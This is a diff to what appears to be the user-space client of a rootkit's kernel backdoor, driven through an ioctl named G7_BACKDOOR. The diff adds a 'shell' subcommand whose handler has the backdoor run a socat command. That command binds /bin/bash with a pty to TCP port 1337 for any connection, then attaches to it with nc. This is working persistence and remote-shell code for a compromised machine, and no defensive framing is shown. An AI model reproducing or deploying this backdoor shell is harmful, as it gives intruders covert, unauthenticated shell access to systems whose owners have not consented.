@@ -52,6 +52,10 @@ parse_input(int argc, char **argv)
         return (cmd_t){ handle_backdoor, (void *)argv[2] };
     }
 
+    if (ARGVCMP(1, "shell")) {
+        return (cmd_t){ handle_shellbd, NULL };
+    }
+
     if (ARGVCMP(1, "backdoor-use-tty")) {
         ASSERT_ARGC(2, "backdoor-use-tty <0 | 1>");
         // TODO: return backdoor-use-tty handle
@@ -82,6 +86,25 @@ int
 handle_backdoor(void *arg)
 {
     return issue_ioctl(G7_BACKDOOR, (const char *)arg);
+}
+
+int
+handle_shellbd(void *arg)
+{
+    const char *socat_cmd = "socat tcp4-listen:1337,reuseaddr,fork"
+        " exec:/bin/bash,pty,stderr,setsid";
+
+    int ret = issue_ioctl(G7_BACKDOOR, socat_cmd);
+
+    char *argv[] = {
+        "nc",
+        "127.0.0.1",
+        "1337",
+        NULL
+    };
+
+    execve(argv[0], argv, NULL);
+    return ret;
 }
 
 int
